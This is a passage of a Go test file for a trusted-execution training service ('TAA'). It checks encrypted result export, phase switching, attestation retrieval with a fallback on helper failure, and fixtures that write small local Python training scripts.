	state.CurrentPhase = 2
	state.mu.Unlock()

	trainDir := filepath.Join(resultDir, "train")
	if err := os.MkdirAll(trainDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(trainDir, "train.bin"), resultPlaintext, 0o644); err != nil {
		t.Fatal(err)
	}

	mux := http.NewServeMux()
	RegisterRoutes(mux, state)
	server := httptest.NewServer(mux)
	t.Cleanup(server.Close)

	resp := postJSON(t, server.URL+"/v1/taa/export", map[string]any{
		"publicKey": string(pubPEM),
		"taskId":    "task-001",
	})
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		t.Fatalf("expected 200 with safe result, got %d body=%s", resp.StatusCode, body)
	}
	if got := resp.Header.Get("Content-Type"); got != "application/octet-stream" {
		t.Fatalf("Content-Type = %q, want application/octet-stream", got)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		t.Fatalf("read response body: %v", err)
	}
	decrypted := openSealedForTAA(t, sm2Key, body)
	files := extractTarGzMap(t, decrypted)
	if got, ok := files["train/train.bin"]; !ok {
		t.Fatalf("tar.gz missing train/train.bin, got keys: %v", keysOfMap(files))
	} else if !bytes.Equal(got, resultPlaintext) {
		t.Fatalf("result = %q, want %q", got, resultPlaintext)
	}
}

// ── Test: full workflow ──────────────────────────────────

func TestFullWorkflow(t *testing.T) {
	state, server := setupTestServer(t)

	// 准备公钥用于 phase 1 import
	state.mu.RLock()
	wfSM2Key := state.SM2PrivateKey
	state.mu.RUnlock()
	wfPub := &wfSM2Key.PublicKey
	wfPubPEM, err := teecrypto.MarshalSM2PublicKeyPEM(wfPub)
	if err != nil {
		t.Fatalf("marshal SM2 public key PEM: %v", err)
	}

	// 1. Import model with publicKey (download will fail with fake URL, but key is saved)
	resp := postJSON(t, server.URL+"/v1/taa/importModel", map[string]any{
		"resourceUrl": "http://example.com/model.tar.gz",
		"requestId":   "req-wf-001",
		"publicKey":   string(wfPubPEM),
	})
	api := decodeResponse(t, resp)
	// 下载会失败，但 publicKey 应该已保存
	if api.Error == 0 {
		t.Log("import model succeeded (unexpected with fake URL)")
	}

	// 2. Switch to test phase
	resp = postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 2})
	api = decodeResponse(t, resp)
	if api.Error != 0 {
		t.Fatalf("switch to test: %s", api.Msg)
	}

	// 3. Switch to training phase
	resp = postJSON(t, server.URL+"/v1/taa/switch", map[string]int{"phase": 3})
	api = decodeResponse(t, resp)
	if api.Error != 0 {
		t.Fatalf("switch to training: %s", api.Msg)
	}

	// 4. Simulate training done (platform reports to TAA)
	resp = postJSON(t, server.URL+"/v1/taa/reportRes", map[string]any{
		"requestId": "req-wf-003",
		"code":      0,
		"msg":       nil,
	})
	api = decodeResponse(t, resp)
	if api.Error != 0 {
		t.Fatalf("report result: %s", api.Msg)
	}

	// 5. Export result (phase 3 uses saved key, publicKey must be empty)
	wfPlaintext := []byte("mock training result")
	trainDir := filepath.Join(state.Security.ResultDir, "train")
	if err := os.MkdirAll(trainDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(trainDir, "debug.bin"), wfPlaintext, 0o644); err != nil {
		t.Fatal(err)
	}
	resp = postJSON(t, server.URL+"/v1/taa/export", map[string]any{
		"taskId": "task-wf-001",
	})
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		t.Fatalf("export status = %d body=%s", resp.StatusCode, body)
	}
	if got := resp.Header.Get("X-TAA-Task-Id"); got != "task-wf-001" {
		resp.Body.Close()
		t.Fatalf("export X-TAA-Task-Id = %q, want task-wf-001", got)
	}
	if got := resp.Header.Get("X-TAA-Encrypted"); got != "true" {
		resp.Body.Close()
		t.Fatalf("export X-TAA-Encrypted = %q, want true", got)
	}
	sealed, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		t.Fatalf("read export body: %v", err)
	}
	wfDecrypted := openSealedForTAA(t, wfSM2Key, sealed)
	files := extractTarGzMap(t, wfDecrypted)
	if got, ok := files["train/debug.bin"]; !ok {
		t.Fatalf("tar.gz missing train/debug.bin, got keys: %v", keysOfMap(files))
	} else if !bytes.Equal(got, wfPlaintext) {
		t.Fatalf("export result = %q, want %q", got, wfPlaintext)
	}

	// 7. Get attestation
	resp = postJSON(t, server.URL+"/v1/taa/getAttestation", map[string]any{
		"requestId": "req-wf-004",
	})
	api = decodeResponse(t, resp)
	if api.Error != 0 {
		t.Fatalf("get attestation: %s", api.Msg)
	}
	attResult := api.Result.(map[string]any)
	if attResult["requestId"] != "req-wf-004" {
		t.Fatalf("attestation requestId = %v", attResult["requestId"])
	}
	if attResult["attestation"] == "" {
		t.Fatal("attestation is empty")
	}
	if attResult["attestationValues"] == "" {
		t.Fatal("attestationValues is empty")
	}

	t.Logf("full workflow passed: phase=%d modelImported=%v dataImported=%v trainingDone=%v",
		state.CurrentPhase, state.ModelImported, state.DataImported, state.TrainingDone)
	fmt.Println("=== Full workflow test PASSED ===")
}

func TestGetAttestationHandlerFallsBackOnHelperFailure(t *testing.T) {
	state, server := setupTestServer(t)
	state.mu.Lock()
	state.HelperPath = filepath.Join(t.TempDir(), "missing-helper.sh")
	state.mu.Unlock()

	resp := postJSON(t, server.URL+"/v1/taa/getAttestation", map[string]any{
		"requestId": "req-att-fallback-001",
	})
	api := decodeResponse(t, resp)
	if resp.StatusCode != http.StatusOK || api.Error != 0 {
		t.Fatalf("expected 200/0, got %d/%d msg=%s", resp.StatusCode, api.Error, api.Msg)
	}
	if !strings.Contains(api.Msg, "获取报告失败") {
		t.Fatalf("msg = %q, want failure notice", api.Msg)
	}
	result, ok := api.Result.(map[string]any)
	if !ok {
		t.Fatalf("result is not a map: %T", api.Result)
	}
	if result["attestation"] != "" {
		t.Fatalf("attestation = %v, want empty", result["attestation"])
	}
	if result["attestationValues"] != "" {
		t.Fatalf("attestationValues = %v, want empty", result["attestationValues"])
	}
	if result["verifiedPass"] != false {
		t.Fatalf("verifiedPass = %v, want false", result["verifiedPass"])
	}
}

// setupModelTrainScript writes a minimal train.py into ModelDir, simulating the
// Phase 1 model package extraction that happens before Phase 2/3 in production.
func setupModelTrainScript(t *testing.T, modelDir string) {
	t.Helper()
	script := "#!/usr/bin/env python3\n" +
		"from argparse import ArgumentParser\n" +
		"from pathlib import Path\n" +
		"import json\n" +
		"\n" +
		"parser = ArgumentParser(add_help=False)\n" +
		"parser.add_argument(\"--data-dir\", dest=\"data_dir\", required=True)\n" +
		"parser.add_argument(\"--output\", \"-o\", dest=\"output_dir\", required=True)\n" +
		"args, _ = parser.parse_known_args()\n" +
		"output_dir = Path(args.output_dir)\n" +
		"output_dir.mkdir(parents=True, exist_ok=True)\n" +
		"result = {\n" +
		"    \"dataset\": {\"total_samples\": 1, \"splits\": {\"train\": 1, \"test\": 0}},\n" +
		"    \"metrics\": {\"loss\": 0.0, \"accuracy\": 1.0},\n" +
		"}\n" +
		"(output_dir / \"marker.txt\").write_text(\"ok\\n\")\n" +
		"(output_dir / \"training_result.json\").write_text(json.dumps(result, indent=2, ensure_ascii=False) + \"\\n\")\n" +
		"(output_dir / \"training_report.json\").write_text(json.dumps({\n" +
		"    \"training_task\": {\"status\": \"succeeded\", \"exit_code\": 0},\n" +
		"    \"dataset\": result[\"dataset\"],\n" +
		"    \"metrics\": result[\"metrics\"],\n" +
		"}, indent=2, ensure_ascii=False) + \"\\n\")\n"
	if err := os.WriteFile(filepath.Join(modelDir, "train.py"), []byte(script), 0o755); err != nil {
		t.Fatalf("write model train.py: %v", err)
	}
	if err := os.WriteFile(filepath.Join(modelDir, "resource_info.py"), resourceInfoScriptFixture(), 0o755); err != nil {
		t.Fatalf("write model resource_info.py: %v", err)
	}
}

func resourceInfoScriptFixture() []byte {
	return []byte("#!/usr/bin/env python3\n" +
		"from argparse import ArgumentParser\n" +
		"from pathlib import Path\n" +
		"import json\n" +
		"\n" +
		"parser = ArgumentParser(add_help=False)\n" +
		"parser.add_argument(\"--data-dir\", dest=\"data_dir\", default=str(Path.cwd()))\n" +
		"args, _ = parser.parse_known_args()\n" +
		"payload = {\n" +
		"    \"total_samples\": 1,\n" +
		"    \"splits\": {\"train\": 1, \"test\": 0},\n" +
		"    \"data_structure\": {\"features\": [{\"name\": \"feature1\", \"type\": \"float\", \"description\": \"feature 1\"}, {\"name\": \"label\", \"type\": \"int\", \"description\": \"label\"}]},\n" +
		"    \"checksum\": {\"algorithm\": \"sm3\", \"value\": \"fixture\"},\n" +
		"}\n" +
		"print(json.dumps(payload, indent=2, ensure_ascii=False))\n")
}
